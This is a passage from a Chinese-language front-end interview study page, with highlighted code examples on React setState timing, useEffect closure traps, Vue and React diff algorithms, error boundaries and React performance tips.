      <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state callback...'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token comment">// callback</span>
    <span class="token punctuation">)</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--- end ---'</span><span class="token punctuation">)</span>

    <span class="token comment">// 结果: </span>
    <span class="token comment">// start </span>
    <span class="token comment">// end</span>
    <span class="token comment">// state callback {val:1} </span>
    <span class="token comment">// promise then </span>

    <span class="token comment">// 疑问？</span>
    <span class="token comment">// promise then微任务先注册的，按理应该先打印promise then再到state callback</span>
    <span class="token comment">// 因为：setState本质是同步的，不过让react做成异步更新的样子而已</span>
    <span class="token comment">// 因为要考虑性能，多次state修改，只进行一次DOM渲染</span>
  <span class="token punctuation">}</span>

  <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// setTimeout中setState是同步更新</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--- start ---'</span><span class="token punctuation">)</span>

      Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise then'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span>
      <span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state...'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">)</span>
  
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--- end ---'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment">// 结果: </span>
    <span class="token comment">// start </span>
    <span class="token comment">// state {val:1} </span>
    <span class="token comment">// end</span>
    <span class="token comment">// promise then </span>
  <span class="token punctuation">}</span>

  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">&lt;</span>p id<span class="token operator">=</span><span class="token string">&quot;p1&quot;</span> onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>
      setState demo<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="react-useeffect闭包陷阱问题"><a href="#react-useeffect闭包陷阱问题" class="header-anchor">#</a> React useEffect闭包陷阱问题</h3> <blockquote><p>问：按钮点击三次后，定时器输出什么？</p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">useEffectDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span>setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">}</span> <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><blockquote><p>答案一直是<code>0</code> <code>useEffect</code>闭包陷阱问题，<code>useEffect</code>依赖是空的，只会执行一次。<code>setInterval</code>中的<code>value</code>就只会获取它之前的变量。而<code>react</code>有个特点，每次<code>value</code>变化都会重新执行<code>useEffectDemo</code>这个函数。点击了三次函数会执行三次，三次过程中每个函数中<code>value</code>都不一样，<code>setInterval</code>获取的永远是第一个函数里面的<code>0</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 追问：怎么才能打印出3？</span>

<span class="token keyword">function</span> <span class="token function">useEffectDemo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span>setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token comment">// 3</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token comment">// value变化会导致useEffectDemo函数多次执行，多次执行需要清除上一次的定时器，否则多次注册定时器</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 这里增加依赖项，每次依赖变化都会重新执行</span>

  <span class="token keyword">const</span> <span class="token function-variable function">clickHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setValue</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
      <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">}</span> <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>clickHandler<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="vue-react-diff-算法有什么区别"><a href="#vue-react-diff-算法有什么区别" class="header-anchor">#</a> Vue React diff 算法有什么区别</h3> <p><strong>diff 算法</strong></p> <ul><li><code>Vue React diff</code> 不是对比文字，而是 <code>vdom</code> 树，即 <code>tree diff</code></li> <li>传统的 <code>tree diff</code> 算法复杂度是 <code>O(n^3)</code> ，算法不可用。</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/98d2444a4b7995d9.png" loading="lazy" class="lazy"></p> <p><strong>优化</strong></p> <blockquote><p><code>Vue React</code> 都是用于网页开发，基于 <code>DOM</code> 结构，对 <code>diff</code> 算法都进行了优化（或者简化）</p></blockquote> <ul><li>只在同一层级比较，不跨层级（<code>DOM</code> 结构的变化，很少有跨层级移动）</li> <li><code>tag</code> 不同则直接删掉重建，不去对比内部细节（<code>DOM</code> 结构变化，很少有只改外层，不改内层）</li> <li>同一个节点下的子节点，通过 <code>key</code> 区分</li></ul> <blockquote><p>最终把时间复杂度降低到 <code>O(n)</code> ，生产环境下可用。这一点 <code>Vue React</code> 都是相同的。</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/49204f33f8e7a350.png" loading="lazy" class="lazy"></p> <p><strong>React diff 特点 - 仅向右移动</strong></p> <blockquote><p>比较子节点时，仅向右移动，不向左移动。</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/7e0177856595febb.png" loading="lazy" class="lazy"></p> <p><strong>Vue2 diff 特点 - 双端比较</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/dc386faff0955e94.png" loading="lazy" class="lazy"></p> <p>定义四个指针，分别比较</p> <ul><li><code>oldStartNode</code> 和 <code>newStartNode</code></li> <li><code>oldStartNode</code> 和 <code>newEndNode</code></li> <li><code>oldEndNode</code> 和 <code>newStartNode</code></li> <li><code>oldEndNode</code> 和 <code>newEndNode</code></li></ul> <blockquote><p>然后指针继续向中间移动，直到指针汇合</p></blockquote> <p><strong>Vue3 diff 特点 - 最长递增子序列</strong></p> <blockquote><p>例如数组 <code>[3，5，7，1，2，8]</code> 的最长递增子序列就是 <code>[3，5，7，8 ]</code> 。这是一个专门的算法。</p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/05879e82f60fa7af.png" loading="lazy" class="lazy"></p> <p><strong>算法步骤</strong></p> <ul><li>通过“前-前”比较找到开始的不变节点 <code>[A, B]</code></li> <li>通过“后-后”比较找到末尾的不变节点 <code>[G]</code></li> <li>剩余的有变化的节点 <code>[F, C, D, E, H]</code> <ul><li>通过 <code>newIndexToOldIndexMap</code> 拿到 <code>oldChildren</code> 中对应的 <code>index</code> <code>[5, 2, 3, 4, -1]</code> （<code>-1</code> 表示之前没有，要新增）</li> <li>计算<strong>最长递增子序列</strong>得到 <code>[2, 3, 4]</code> ，对应的就是 <code>[C, D, E]</code> ，即这些节点可以不变</li> <li>剩余的节点，根据 <code>index</code> 进行新增、删除</li></ul></li></ul> <blockquote><p>该方法旨在尽量减少 <code>DOM</code> 的移动，<code>达到最少的DOM操作</code>。</p></blockquote> <p><strong>总结</strong></p> <ul><li><code>React diff</code> 特点 - 仅向右移动</li> <li><code>Vue2 diff</code> 特点 - <code>updateChildren</code>双端比较</li> <li><code>Vue3 diff</code> 特点 - <code>updateChildren</code>增加了最长递增子序列，更快
<ul><li><code>Vue3</code>增加了<code>patchFlag</code>、静态提升、函数缓存等</li></ul></li></ul> <p><strong>连环问：diff 算法中 key 为何如此重要</strong></p> <p>无论在 <code>Vue</code> 还是 React 中，<code>key</code> 的作用都非常大。以 <code>React</code> 为例，是否使用 <code>key</code> 对内部 <code>DOM</code> 变化影响非常大。</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/a68a7962c0801e70.png" loading="lazy" class="lazy"></p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(index, num) in nums<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    {{num}}
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-jsx extra-class"><pre class="language-jsx"><code><span class="token keyword">const</span> todoItems <span class="token operator">=</span> todos<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">todo</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>todo<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
    </span><span class="token punctuation">{</span>todo<span class="token punctuation">.</span>text<span class="token punctuation">}</span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">)</span>
</code></pre></div><h3 id="如何统一监听react组件报错"><a href="#如何统一监听react组件报错" class="header-anchor">#</a> 如何统一监听React组件报错</h3> <ul><li><strong>ErrorBoundary组件</strong> <ul><li>在<code>react16</code>版本之后，增加了<code>ErrorBoundary</code>组件</li> <li>监听所有<code>下级组件</code>报错，可降级展示<code>UI</code></li> <li>只监听组件渲染时报错，不监听<code>DOM</code>事件错误、异步错误
<ul><li><code>ErrorBoundary</code>没有办法监听到点击按钮时候的在<code>click</code>的时候报错</li> <li>只能监听组件从一开始渲染到渲染成功这段时间报错，渲染成功后在怎么操作产生的错误就不管了</li> <li>可用<code>try catch</code>或者<code>window.onerror</code>（二选一）</li></ul></li> <li>只在<code>production</code>环境生效(需要打包之后查看效果)，<code>dev</code>会直接抛出错误</li></ul></li> <li><strong>总结</strong> <ul><li><code>ErrorBoundary</code>监听组件渲染报错</li> <li>事件报错使用<code>try catch</code>或<code>window.onerror</code></li> <li>异步报错使用<code>window.onerror</code></li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// ErrorBoundary.js</span>

<span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">class</span> <span class="token class-name">ErrorBoundary</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token keyword">null</span> <span class="token comment">// 存储当前的报错信息</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">static</span> <span class="token function">getDerivedStateFromError</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 更新 state 使下一次渲染能够显示降级后的 UI</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'getDerivedStateFromError...'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span> error <span class="token punctuation">}</span> <span class="token comment">// return的信息会等于this.state的信息</span>
  <span class="token punctuation">}</span>
  <span class="token function">componentDidCatch</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> errorInfo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 统计上报错误信息</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'componentDidCatch...'</span><span class="token punctuation">,</span> error<span class="token punctuation">,</span> errorInfo<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 提示错误</span>
      <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>报错了<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 没有错误，就渲染子组件</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>children
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// index.js 中使用</span>
<span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> ErrorBoundary <span class="token keyword">from</span> <span class="token string">'./ErrorBoundary'</span>

ReactDOM<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>
  <span class="token operator">&lt;</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ErrorBoundary<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ErrorBoundary<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span><span class="token punctuation">,</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="在实际工作中-你对react做过哪些优化"><a href="#在实际工作中-你对react做过哪些优化" class="header-anchor">#</a> 在实际工作中，你对React做过哪些优化</h3> <ul><li><strong>修改CSS模拟v-show</strong><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 原始写法</span>
<span class="token punctuation">{</span><span class="token operator">!</span>flag <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span>MyComonent style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">display</span><span class="token operator">:</span><span class="token string">'none'</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span>flag <span class="token operator">&amp;&amp;</span> <span class="token operator">&lt;</span>MyComonent <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">}</span>

<span class="token comment">// 模拟v-show</span>
<span class="token punctuation">{</span><span class="token operator">&lt;</span>MyComonent style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token literal-property property">display</span><span class="token operator">:</span>flag <span class="token operator">?</span> <span class="token string">'block'</span> <span class="token operator">:</span> <span class="token string">'none'</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">}</span>
</code></pre></div></li> <li><strong>循环使用key</strong> <ul><li><code>key</code>不要用<code>index</code></li></ul></li> <li><strong>使用Flagment或&lt;&gt;&lt;/&gt;空标签包裹减少多个层级组件的嵌套</strong></li> <li><strong>jsx中不要定义函数</strong>：<code>JSX</code>会被频繁执行的<div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// bad </span>
<span class="token comment">// react中的jsx被频繁执行（state更改）应该避免函数被多次新建</span>
<span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token comment">// goods</span>
<span class="token keyword">function</span> <span class="token function">useButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token function-variable function">handleClick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span><span class="token operator">&gt;</span>点击<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><strong>使用shouldComponentUpdate</strong> <ul><li>判断组件是否需要更新</li> <li>或者使用<code>React.PureComponent</code>比较<code>props</code>第一层属性</li> <li>函数组件使用<code>React.memo(comp, fn)</code>包裹 <code>function fn(prevProps,nextProps) {// 自己实现对比，像shouldComponentUpdate}</code></li></ul></li> <li><strong>Hooks缓存数据和函数</strong> <ul><li><code>useCallback</code>: 缓存回调函数，避免传入的回调每次都是新的函数实例而导致依赖组件重新渲染，具有性能优化的效果</li> <li><code>useMemo</code>: 用于缓存传入的 <code>props</code>，避免依赖的组件每次都重新渲染</li></ul></li> <li><strong>使用异步组件</strong><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span><span class="token punctuation">{</span>lazy<span class="token punctuation">,</span>Suspense<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>
<span class="token keyword">const</span> OtherComp <span class="token operator">=</span> <span class="token function">lazy</span><span class="token punctuation">(</span><span class="token comment">/**webpackChunkName:'OtherComp'**/</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./otherComp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">MyComp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token operator">&lt;</span>Suspense fallback<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>loading<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>OtherComp <span class="token operator">/</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>Suspense<span class="token operator">&gt;</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><strong>路由懒加载</strong><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> React<span class="token punctuation">,</span><span class="token punctuation">{</span>lazy<span class="token punctuation">,</span>Suspense<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserRouter <span class="token keyword">as</span> Router<span class="token punctuation">,</span>Route<span class="token punctuation">,</span> Switch<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react-router-dom'</span>

<span class="token keyword">const</span> Home <span class="token operator">=</span> <span class="token function">lazy</span><span class="token punctuation">(</span><span class="token comment">/**webpackChunkName:'h=Home'**/</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./Home'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> List <span class="token operator">=</span> <span class="token function">lazy</span><span class="token punctuation">(</span><span class="token comment">/**webpackChunkName:'List'**/</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./List'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> <span class="token function-variable function">App</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">(</span>
  <span class="token operator">&lt;</span>Router<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>Suspense fallback<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>loading<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>Switch<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Route exact path<span class="token operator">=</span><span class="token string">'/'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>Home<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Route exact path<span class="token operator">=</span><span class="token string">'/list'</span> component<span class="token operator">=</span><span class="token punctuation">{</span>List<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>Switch<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>Suspense<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>Router<span class="token operator">&gt;</span>
<span class="token punctuation">)</span>
</code></pre></div></li> <li><strong>使用SSR</strong>：<code>Next.js</code></li></ul> <p><strong>连环问：你在使用React时遇到过哪些坑</strong></p> <ul><li><p><strong>自定义组件的名称首字母要大写</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 原生html组件</span>
<span class="token operator">&lt;</span>input <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token comment">// 自定义组件</span>
<span class="token operator">&lt;</span>Input <span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre></div></li> <li><p><strong>JS关键字的冲突</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// for改成htmlFor，class改成className</span>
<span class="token operator">&lt;</span>label htmlFor<span class="token operator">=</span><span class="token string">&quot;input-name&quot;</span> className<span class="token operator">=</span><span class="token string">&quot;label&quot;</span><span class="token operator">&gt;</span>
  用户名 <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">&quot;username&quot;</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>
</code></pre></div></li> <li><p><strong>JSX数据类型</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// correct</span>
<span class="token operator">&lt;</span>Demo flag<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token comment">// error</span>
<span class="token operator">&lt;</span>Demo flag<span class="token operator">=</span><span class="token string">&quot;true&quot;</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre></div></li> <li><p><strong>setState不会马上获取最新的结果</strong></p> <ul><li>如需要实时获取结果，在回调函数中获取 <code>setState({count:this.state.count + 1},()=&gt;console.log(this.state.count)})</code></li> <li><code>setState</code>在合成事件和生命周期钩子中，是异步更新的</li> <li>在<strong>原生事件</strong>和<code>setTimeout</code>中，<code>setState</code>是同步的，可以马上获取更新后的值；</li> <li>原因: 原生事件是浏览器本身的实现，与事务流无关，自然是同步；而<code>setTimeout</code>是放置于定时器线程中延后执行，此时事务流已结束，因此也是同步；</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState原理模拟</span>
<span class="token keyword">let</span> isBatchingUpdate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

